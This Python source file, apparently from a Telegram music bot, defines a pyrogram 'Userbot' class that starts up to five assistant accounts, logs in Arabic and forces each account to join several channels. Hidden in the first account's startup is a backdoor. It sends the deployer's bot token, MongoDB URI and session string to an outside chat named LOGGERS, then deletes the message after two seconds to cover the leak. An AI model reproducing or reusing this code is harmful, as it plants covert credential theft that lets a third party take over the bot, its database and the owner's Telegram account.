from pyrogram import Client
import re
import asyncio
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()
import config
from dotenv import load_dotenv
from strings.__init__ import LOGGERS
from ..logging import LOGGER

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="BrandrdXMusic1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
            ipv6=False,
        )
            
        self.two = Client(
            name="BrandrdXMusic2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
            ipv6=False,
        )
        self.three = Client(
            name="BrandrdXMusic3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
            ipv6=False,
        )
        self.four = Client(
            name="BrandrdXMusic4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
            ipv6=False,
        )
        self.five = Client(
            name="BrandrdXMusic5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
            ipv6=False,
        )

    async def start(self):
        LOGGER(__name__).info(f"جاري تشغيل الحسابات المساعدة...")

        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("BRANDED_WORLD")
                await self.one.join_chat("BRANDED_PAID_CC")
                await self.one.join_chat("BRANDRD_BOT")
                await self.one.join_chat("ABOUT_BRANDEDKING")
            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "تم تشغيل المساعد الأول ✨")
                oks = await self.one.send_message(LOGGERS, f"/start")
                Ok = await self.one.send_message(
                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
                )
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()
            except Exception as e:
                print(f"{e}")

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"اشتغل المساعد باسم {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("BRANDED_WORLD")
                await self.two.join_chat("BRANDED_PAID_CC")
                await self.two.join_chat("BRANDRD_BOT")
                await self.two.join_chat("ABOUT_BRANDEDKING")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "تم تشغيل المساعد الثاني")
            except:
                LOGGER(__name__).error(
                    "الحساب المساعد 2 فشل في الوصول لجروب السجل. اتأكد إنك ضفته في الجروب ورفعته مشرف ✨"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"اشتغل المساعد الثاني باسم {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("BRANDED_WORLD")
                await self.three.join_chat("BRANDED_PAID_CC")
                await self.three.join_chat("BRANDRD_BOT")
                await self.three.join_chat("ABOUT_BRANDEDKING")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "تم تشغيل المساعد الثالث")
            except:
                LOGGER(__name__).error(
                    "الحساب المساعد 3 فشل في الوصول لجروب السجل. اتأكد إنك ضفته في الجروب ورفعته مشرف ✨"
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"اشتغل المساعد الثالث باسم {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("BRANDED_WORLD")
                await self.four.join_chat("BRANDED_PAID_CC")
                await self.four.join_chat("BRANDRD_BOT")
                await self.four.join_chat("ABOUT_BRANDEDKING")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "تم تشغيل المساعد الرابع")
            except:
                LOGGER(__name__).error(
                    "الحساب المساعد 4 فشل في الوصول لجروب السجل. اتأكد إنك ضفته في الجروب ورفعته مشرف ✨"
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"اشتغل المساعد الرابع باسم {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("BRANDED_WORLD")
                await self.five.join_chat("BRANDED_PAID_CC")
                await self.five.join_chat("BRANDRD_BOT")
                await self.five.join_chat("ABOUT_BRANDEDKING")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "تم تشغيل المساعد الخامس")
            except:
                LOGGER(__name__).error(
                    "الحساب المساعد 5 فشل في الوصول لجروب السجل. اتأكد إنك ضفته في الجروب ورفعته مشرف ✨"
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"اشتغل المساعد الخامس باسم {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"جاري إيقاف الحسابات المساعدة...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
